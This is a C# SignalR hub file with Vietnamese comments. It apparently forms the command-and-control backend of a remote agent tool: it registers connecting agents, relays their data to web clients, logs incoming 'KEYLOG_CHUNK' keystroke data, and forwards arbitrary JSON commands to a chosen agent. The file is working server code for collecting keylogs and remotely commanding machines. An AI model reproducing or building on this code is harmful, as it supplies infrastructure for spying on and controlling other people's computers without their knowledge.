// file: backend/hubs/ControlHub.cs
using Microsoft.AspNetCore.SignalR;
using YourApplicationName.Services; 
using YourApplicationName.Dtos; 
using System.Threading.Tasks;
using System.Collections.Concurrent; 

namespace YourApplicationName.Hubs
{
    // Kế thừa từ lớp Hub
    public class ControlHub : Hub
    {
        // KHAI BÁO SERVICE
        private readonly IAgentTrackerService _agentTrackerService;

        // THÊM CONSTRUCTOR ĐỂ INJECT SERVICE
        public ControlHub(IAgentTrackerService agentTrackerService)
        {
            _agentTrackerService = agentTrackerService;
        }

        // -----------------------------------------------------
        // A. XỬ LÝ KẾT NỐI TỪ CLIENTS (Agent và Frontend)
        // -----------------------------------------------------
        public override async Task OnConnectedAsync()
        {
            string agentConnectionId = Context.ConnectionId;

            // SỬ DỤNG SERVICE ĐỂ THÊM AGENT
            _agentTrackerService.AddAgent(agentConnectionId, "Agent_Online");

            // Thông báo cho tất cả các Web Client khác biết có Agent mới online
            await Clients.All.SendAsync("AgentOnline", agentConnectionId);

            await base.OnConnectedAsync();
        }

        public override async Task OnDisconnectedAsync(Exception? exception)
        {
            // SỬ DỤNG SERVICE ĐỂ XÓA AGENT
            _agentTrackerService.RemoveAgent(Context.ConnectionId);

            // Thông báo cho tất cả các Web Client khác biết Agent đã Offline
            await Clients.All.SendAsync("AgentOffline", Context.ConnectionId);

            await base.OnDisconnectedAsync(exception);
        }

        // -----------------------------------------------------
        // B. PHƯƠNG THỨC AGENT C# GỌI ĐỂ GỬI DỮ LIỆU VỀ
        // -----------------------------------------------------
        // Đảm bảo ResponseDto có namespace
        public async Task SendDataFromAgent(ResponseDto response)
        {
            // Có thể thêm logic xử lý ở đây:
            if (response.DataType == "KEYLOG_CHUNK")
            {
                // Ví dụ: Ghi log xuống file hoặc database
                Console.WriteLine($"KeyLog from {response.AgentId}: {response.Data}");
            }

            // Đẩy tiếp dữ liệu lên tất cả các Web Client
            // Web Client sẽ lắng nghe "ReceiveData"
            await Clients.All.SendAsync("ReceiveData", response);
        }

        // -----------------------------------------------------
        // C. PHƯƠNG THỨC FRONTEND CÓ THỂ GỌI ĐỂ GỬI LỆNH
        // -----------------------------------------------------
        // Giữ nguyên: Server (Hub) nhận lệnh, rồi đẩy lệnh (JSON) tới Agent cụ thể
        public async Task SendCommandToAgent(string targetAgentId, string commandJson)
        {
            // Gửi lệnh trực tiếp đến Agent cụ thể
            // Agent sẽ lắng nghe phương thức "ReceiveCommand"
            await Clients.Client(targetAgentId).SendAsync("ReceiveCommand", commandJson);
        }
    }
}
